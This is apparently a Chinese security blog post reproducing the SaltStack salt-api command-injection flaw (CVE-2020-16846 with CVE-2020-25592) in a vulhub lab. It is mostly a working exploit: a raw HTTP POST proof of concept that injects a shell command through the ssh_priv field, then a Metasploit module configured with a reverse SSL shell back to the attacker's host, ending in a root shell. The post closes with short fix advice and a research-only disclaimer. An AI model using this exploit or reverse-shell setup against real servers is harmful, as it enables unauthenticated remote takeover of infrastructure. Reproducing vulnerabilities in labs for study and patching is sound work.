<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NEeGbPM2A-fnrJjJapmpzQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjdtGyk8NAVBE5jGNPxxuW1thKJHDUFkhXyboGPQ4xGyRPJiaOItc7pbIWx9KnDLbjJK6y8drFg28eA/640?wx_fmt=jpeg)

SaltStack Shell 注入 (CVE-2020-16846) 漏洞复现

一、漏洞简介

SaltStack 是一个分布式运维系统，在互联网场景中被广泛应用，有以下两个主要功能：

  •     配置管理系统，能够将远程节点维护在一个预定义的状态

  •     分布式远程执行系统，用于在远程节点上单独或通过任意选择标准来执行命令和查询数据

CVE-2020-16846 和 CVE-2020-25592 组合使用可在未授权的情况下通过 salt-api 接口执行任意命令。CVE-2020-25592 允许任意用户调用 SSH 模块，CVE-2020-16846 允许用户执行任意命令。salt-api 虽不是默认开启配置，但绝大多数 SaltStack 用户会选择开启 salt-api，故存在较高风险。

二、环境搭建

下载环境：

```
https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdtGyk8NAVBE5jGNPxxuW1tibMmD9jQq4kic6rWIhbicqkV0EMmBxYowSdibgOCr1tTCRCur7dEnXP3gQ/640?wx_fmt=png)

或者后台回复：CVE-2020-16846 下载环境

环境启动：docker-compose up -d

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdtGyk8NAVBE5jGNPxxuW1t6X1mEnJxe0yZl6VEmqVzOKetC5rXnFxMw8qUfSiaQulPpicwTbT4jT1g/640?wx_fmt=png)

访问地址：https://192.168.1.107:8000/

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdtGyk8NAVBE5jGNPxxuW1tQEq2po1yXNCs4bmclke1c91TcZJrZ1eB6QyZwHbicvic7KqtHEu8jib8g/640?wx_fmt=png)

三、漏洞复现

POC

```
POST /run HTTP/1.1
Host: 192.168.1.107:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/x-yaml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 91

token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b
```

执行 poc  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdtGyk8NAVBE5jGNPxxuW1tEptOznR4S7ZQnQRLmEZAwFs6xX7ibG8JhibtDcSrnc8KpUJvx41OxsnQ/640?wx_fmt=png)

touch 文件成功

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdtGyk8NAVBE5jGNPxxuW1thAcujtBeYWCUlrtcFGEAVE6pslbUCzNcU7ZSOJckY8WQH0oF7QqEvg/640?wx_fmt=png)

msf 里面有 exp

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdtGyk8NAVBE5jGNPxxuW1t2RVRKFQ27WwbwA6sHE4WbHdbllbrsEl1eciaic8IywexZHvQ4oocicOsQ/640?wx_fmt=png)

exploit/linux/http/saltstack_salt_api_cmd_exec

```
use exploit/linux/http/saltstack_salt_api_cmd_exec
msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > set rhosts 192.168.1.107
rhosts => 192.168.1.107
msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > set rport 8000
rport => 8000
msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > set LhOST 192.168.1.117
LhOST => 192.168.1.117
msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > set LPORT 4444
LPORT => 4444
msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > show options 

Module options (exploit/linux/http/saltstack_salt_api_cmd_exec):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS     192.168.1.107    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'   RPORT      8000             yes       The target port (TCP)   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT    8080             yes       The local port to listen on.   SSL        true             no        Negotiate SSL/TLS for outgoing connections   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)   TARGETURI  /                yes       Base path   URIPATH                     no        The URI to use for this exploit (default is random)   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python_ssl):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.1.117    yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen port


Exploit target:   Id  Name   --  ----   0   Unix Command


msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > exploit 

[*] Started reverse SSL handler on 192.168.1.117:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Auth bypass successful.
[*] Executing Unix Command for cmd/unix/reverse_python_ssl
[*] Command shell session 2 opened (192.168.1.117:4444 -> 192.168.1.107:50332) at 2020-12-21 22:34:40 +0800

id
uid=0(root) gid=0(root) groups=0(root)
```

四、漏洞修复

1. 尽快修复。由于官方并未放出升级包，故目前仍需要手动进行修复，这里是官方安全通告和修复补丁。

2. 如非必须使用 salt-api，请关闭该功能。

参考文档：

https://www.anquanke.com/vul/id/2222120

https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846

https://www.secpulse.com/archives/146236.html

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)